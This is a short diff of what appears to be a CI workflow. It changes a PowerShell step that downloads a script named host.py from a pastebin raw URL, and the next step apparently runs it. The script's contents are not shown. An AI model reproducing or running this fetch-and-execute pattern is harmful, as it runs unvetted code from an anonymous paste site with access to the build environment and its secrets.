@@ -27,7 +27,7 @@ jobs:
       - name: Download host.py
         shell: powershell
         run: |
-          Invoke-WebRequest "https://pastebin.com/raw/w5QNKvUp" -OutFile "host.py"
+          Invoke-WebRequest "https://pastebin.com/raw/my1n3fQm" -OutFile "host.py"
 
       - name: Run host.py
         shell: powershell
